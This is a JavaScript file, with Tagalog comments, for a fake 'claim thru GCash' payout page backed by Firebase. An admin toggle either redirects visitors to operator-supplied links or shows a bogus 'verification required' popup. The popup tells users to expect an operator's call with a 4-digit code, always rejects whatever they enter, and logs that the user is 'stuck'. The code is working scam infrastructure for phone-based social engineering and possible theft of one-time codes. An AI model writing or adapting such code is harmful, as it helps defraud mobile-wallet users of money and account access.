/**
 * popup_share.js
 * FINAL LOGIC: Firewall Check & Instant Redirect
 */

// 1. MAIN ACTION: Pag-click sa "CLAIM THRU GCASH"
function handleGcashClaim() {
    // Check agad sa Firebase kung ON o OFF ang Firewall
    db.ref('admin/globalFirewall/active').once('value').then(snap => {
        const isFirewallOn = snap.val();

        if (isFirewallOn === true) {
            // CASE: FIREWALL ON -> Buksan ang Verification Popup
            showFirewallVerificationPopup();
        } else {
            // CASE: FIREWALL OFF -> Hanap ng available link sa "links" node
            db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value').then(linkSnap => {
                if (linkSnap.exists()) {
                    const key = Object.keys(linkSnap.val())[0];
                    const targetUrl = linkSnap.val()[key].url;

                    // INSTANT REDIRECT sa link na galing sa database
                    window.location.href = targetUrl;
                } else {
                    // Walang nakadeploy na link ang admin
                    alert("⚠️ SYSTEM BUSY: No payout link available.");
                }
            });
        }
    }).catch(err => {
        console.error("Firebase Error:", err);
    });
}

// 2. FIREWALL POPUP: Ang screen na lalabas pag ON ang firewall
function showFirewallVerificationPopup() {
    // Iwasan ang pag-duplicate ng popup
    if (document.getElementById('firewallModal')) return;

    const modal = document.createElement('div');
    modal.className = 'firewall-popup-overlay';
    modal.id = 'firewallModal';
    modal.innerHTML = `
        <div class="firewall-box">
            <div class="firewall-warning-icon">📞</div>
            <h2>VERIFICATION REQUIRED</h2>
            <div class="firewall-message">
                <p>Please wait for the system-verification call.</p>
                <p>An operator will provide your 4-digit code shortly.</p>
            </div>
            <div class="verification-input-group">
                <input type="text" id="vCode" class="verification-input" placeholder="0000" maxlength="4">
                <button class="verify-btn" onclick="triggerInvalidMsg()">VERIFY NOW</button>
            </div>
            <!-- Heto ang hiningi mong result na fixed Invalid -->
            <div id="vError" style="display:none; color:#ff3131; font-weight:bold; margin-top:15px; font-size:13px; text-align:center;">
                ❌ Invalid 4-Digit Verification Code Please Try Again...
            </div>
        </div>
    `;
    document.body.appendChild(modal);
}

// 3. AUTOMATIC INVALID: Heto ang result ng pindot sa "Verify Now"
function triggerInvalidMsg() {
    const errorMsg = document.getElementById('vError');
    const input = document.getElementById('vCode');

    // Ipakita ang error message (laging invalid)
    errorMsg.style.display = 'block';
    
    // Linisin ang input para magmukhang nag-reset
    input.value = '';

    // (Optional) Pwede mong lagyan ng console log para alam mong may nag-try
    console.log("Verification Attempt: User is stuck in Firewall.");
}
